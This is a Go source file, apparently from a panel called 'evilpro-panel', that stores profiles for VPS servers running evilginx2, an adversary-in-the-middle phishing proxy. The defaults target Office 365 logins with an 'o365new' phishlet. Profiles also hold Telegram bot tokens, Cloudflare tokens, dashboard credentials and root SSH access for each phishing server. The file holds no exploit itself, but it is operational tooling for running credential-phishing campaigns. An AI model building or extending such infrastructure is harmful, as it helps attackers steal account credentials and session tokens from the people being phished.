package main

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"sync"
)

const appDirName = "evilpro-panel"

// Profile is one managed VPS. Profile-scoped secrets are stored in plain text
// inside the panel config file (mode 0600) on the machine running the panel.
type Profile struct {
	ID   string `json:"id"`
	Name string `json:"name"`

	Host string `json:"host"`
	Port int    `json:"port"`
	User string `json:"user"`

	AuthType      string `json:"auth_type"` // "password" | "key"
	Password      string `json:"password,omitempty"`
	KeyPath       string `json:"key_path,omitempty"`
	KeyPassphrase string `json:"key_passphrase,omitempty"`

	HostKeyFP string `json:"host_key_fp,omitempty"`

	// deployment settings
	InstallDir    string `json:"install_dir"`
	Domain        string `json:"domain"`
	Phishlet      string `json:"phishlet"`
	DashboardSub  string `json:"dashboard_sub"`
	DashboardUser string `json:"dashboard_user"`
	DashboardPass string `json:"dashboard_pass"`
	Debug         bool   `json:"debug"`
	// EngineURL is where the panel reaches the engine's management API. Empty =
	// derived as http://<host>:5000
	EngineURL string `json:"engine_url,omitempty"`

	TelegramToken string `json:"telegram_token,omitempty"`
	TelegramChat  string `json:"telegram_chat,omitempty"`

	CFToken     string `json:"cf_token,omitempty"`
	CFZoneID    string `json:"cf_zone_id,omitempty"`
	CertEmail   string `json:"cert_email,omitempty"`
	UseWildcard bool   `json:"use_wildcard"`

	Notes string `json:"notes,omitempty"`

	// runtime status (filled by checks, persisted for convenience)
	LastStatus string `json:"last_status,omitempty"`
	LastSeen   int64  `json:"last_seen,omitempty"`
	LastError  string `json:"last_error,omitempty"`
	Version    string `json:"version,omitempty"`
}

// Settings are panel-wide preferences.
type Settings struct {
	BinAmd64  string `json:"bin_amd64"`
	BinArm64  string `json:"bin_arm64"`
	RepoDir   string `json:"repo_dir"`
	AutoBuild bool   `json:"auto_build"`
}

type storeFile struct {
	Profiles []*Profile `json:"profiles"`
	Settings Settings   `json:"settings"`
}

// Store is the on-disk profile store.
type Store struct {
	mu   sync.Mutex
	path string
	data storeFile
}

// configDir picks the first writable directory from a list of candidates, so the
// panel works whether it runs from a normal shell, a restricted sandbox, or a
// service account with a locked-down profile.
func configDir() (string, error) {
	var candidates []string
	if configDirOverride != "" {
		candidates = append(candidates, configDirOverride)
	}
	if v := os.Getenv("EVILPRO_PANEL_HOME"); v != "" {
		candidates = append(candidates, v)
	}
	if d, err := os.UserConfigDir(); err == nil && d != "" {
		candidates = append(candidates, filepath.Join(d, appDirName))
	}
	if v := os.Getenv("LOCALAPPDATA"); v != "" {
		candidates = append(candidates, filepath.Join(v, appDirName))
	}
	if v := os.Getenv("XDG_CONFIG_HOME"); v != "" {
		candidates = append(candidates, filepath.Join(v, appDirName))
	}
	if exe, err := os.Executable(); err == nil {
		candidates = append(candidates, filepath.Join(filepath.Dir(exe), "."+appDirName))
	}
	if wd, err := os.Getwd(); err == nil {
		candidates = append(candidates, filepath.Join(wd, "."+appDirName))
	}
	candidates = append(candidates, filepath.Join(os.TempDir(), appDirName))

	for _, c := range candidates {
		if err := os.MkdirAll(c, 0o700); err != nil {
			continue
		}
		probe := filepath.Join(c, ".write-probe")
		if err := os.WriteFile(probe, []byte("ok"), 0o600); err != nil {
			continue
		}
		_ = os.Remove(probe)
		return c, nil
	}
	return "", fmt.Errorf("no writable config directory found (tried %d locations)", len(candidates))
}

func NewStore() (*Store, error) {
	dir, err := configDir()
	if err != nil {
		return nil, err
	}
	s := &Store{path: filepath.Join(dir, "profiles.json")}
	if err := s.load(); err != nil {
		return nil, err
	}
	return s, nil
}

func (s *Store) load() error {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.data.Settings = defaultSettings()
	b, err := os.ReadFile(s.path)
	if err != nil {
		if os.IsNotExist(err) {
			return nil
		}
		return err
	}
	var d storeFile
	if err := json.Unmarshal(b, &d); err != nil {
		return fmt.Errorf("profiles.json is corrupt: %w", err)
	}
	if d.Settings == (Settings{}) {
		d.Settings = defaultSettings()
	}
	s.data = d
	return nil
}

func defaultSettings() Settings {
	wd, _ := os.Getwd()
	return Settings{
		BinAmd64:  filepath.Join(wd, "build", "evilginx-linux"),
		BinArm64:  filepath.Join(wd, "build", "evilginx-linux-arm64"),
		RepoDir:   wd,
		AutoBuild: true,
	}
}

func (s *Store) save() error {
	b, err := json.MarshalIndent(s.data, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(s.path, b, 0o600)
}

func (s *Store) Path() string { return s.path }

func (s *Store) Settings() Settings {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.data.Settings
}

func (s *Store) SetSettings(v Settings) error {
	s.mu.Lock()
	s.data.Settings = v
	err := s.save()
	s.mu.Unlock()
	return err
}

func (s *Store) List() []*Profile {
	s.mu.Lock()
	defer s.mu.Unlock()
	out := make([]*Profile, len(s.data.Profiles))
	copy(out, s.data.Profiles)
	sort.Slice(out, func(i, j int) bool { return strings.ToLower(out[i].Name) < strings.ToLower(out[j].Name) })
	return out
}

func (s *Store) Get(id string) *Profile {
	s.mu.Lock()
	defer s.mu.Unlock()
	for _, p := range s.data.Profiles {
		if p.ID == id {
			return p
		}
	}
	return nil
}

// Upsert inserts or replaces a profile by ID and returns the stored copy.
func (s *Store) Upsert(p *Profile) (*Profile, error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	isNew := p.ID == ""
	if isNew {
		p.ID = newID()
	}
	applyDefaults(p, isNew)
	for i, e := range s.data.Profiles {
		if e.ID == p.ID {
			s.data.Profiles[i] = p
			if err := s.save(); err != nil {
				return nil, err
			}
			return p, nil
		}
	}
	s.data.Profiles = append(s.data.Profiles, p)
	if err := s.save(); err != nil {
		return nil, err
	}
	return p, nil
}

func (s *Store) Delete(id string) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	out := s.data.Profiles[:0]
	for _, p := range s.data.Profiles {
		if p.ID != id {
			out = append(out, p)
		}
	}
	s.data.Profiles = out
	return s.save()
}

// Update runs fn against the stored profile under lock (for status writes).
func (s *Store) Update(id string, fn func(*Profile)) {
	s.mu.Lock()
	defer s.mu.Unlock()
	for _, p := range s.data.Profiles {
		if p.ID == id {
			fn(p)
			_ = s.save()
			return
		}
	}
}

func applyDefaults(p *Profile, isNew bool) {
	if p.Port == 0 {
		p.Port = 22
	}
	if p.User == "" {
		p.User = "root"
	}
	if p.AuthType == "" {
		p.AuthType = "password"
	}
	if p.InstallDir == "" {
		p.InstallDir = "/root/evilginx2"
	}
	if p.Phishlet == "" {
		p.Phishlet = "o365new"
	}
	if p.DashboardSub == "" {
		p.DashboardSub = "panel"
	}
	if p.DashboardUser == "" {
		p.DashboardUser = "admin"
	}
	if p.CertEmail == "" && p.Domain != "" {
		p.CertEmail = "admin@" + p.Domain
	}
	if isNew {
		p.Debug = true
	}
	if p.Name == "" {
		p.Name = p.Host
	}
}

func newID() string {
	b := make([]byte, 6)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}
